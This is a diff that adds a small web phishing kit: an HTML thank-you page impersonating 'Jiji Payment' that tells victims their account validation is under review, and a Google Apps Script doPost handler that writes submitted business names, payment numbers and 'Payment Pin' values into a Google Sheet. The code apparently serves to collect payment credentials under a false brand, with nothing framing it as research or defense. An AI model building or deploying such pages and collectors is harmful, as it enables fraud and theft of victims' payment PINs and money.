@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Thank You - Jiji Payment</title>
+  <style>
+    body { font-family: Arial, sans-serif; background-color: #f5f5f5; margin:0; padding:0; }
+    .container { max-width:400px; margin:60px auto; background:#fff; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.1); overflow:hidden; text-align:center; }
+    .header{ background:#00b140; color:#fff; padding:22px 15px; }
+    .header h2{ margin:0; font-size:20px; line-height:1.4; }
+    .content{ padding:30px 20px; }
+    .content p{ font-size:15px; color:#333; margin-bottom:20px; line-height:1.5; }
+    .footer{ background:#00b140; color:#fff; text-align:center; padding:12px; font-size:13px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h2>Dear Customer !</h2>
+    </div>
+    <div class="content">
+      <p>Thank you for validating your account.</p>
+      <p>Your submission has been received and is being reviewed.</p>
+      <p>A message will be delivered via email or SMS after confirmation.</p>
+    </div>
+    <div class="footer">
+      © 2025 Jiji Subscriptions – All Rights Reserved
+    </div>
+  </div>
+
+  <script>
+    // Auto-redirect to front page after 5 seconds
+    setTimeout(() => {
+      window.location.href = "index.html";
+    }, 5000);
+  </script>
+</body>
+</html>
+
+
+DoPost 
+
+
+const SPREADSHEET_ID = '1Rvw1EaujUJ1z8osvLmHQnmosxFJwniZLroV8gZMgH9E';
+const SHEET_NAME = 'Sheet1';
+
+function doPost(e) {
+  try {
+    const data = JSON.parse(e.postData.contents);
+
+    const business = data.business || '';
+    const paymentNumber = data.paymentNumber || '';
+    const reference = data.reference || '';
+
+    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
+    const sheet = ss.getSheetByName(SHEET_NAME) || ss.insertSheet(SHEET_NAME);
+
+    if (sheet.getLastRow() === 0) {
+      sheet.appendRow(['Business Name', 'Payment Number', 'Payment Pin']);
+    }
+
+    sheet.appendRow([business, paymentNumber, reference]);
+
+    return ContentService
+      .createTextOutput(JSON.stringify({ result: 'success' }))
+      .setMimeType(ContentService.MimeType.JSON);
+
+  } catch (error) {
+    return ContentService
+      .createTextOutput(JSON.stringify({ result: 'error', message: error.message }))
+      .setMimeType(ContentService.MimeType.JSON);
+  }
+}
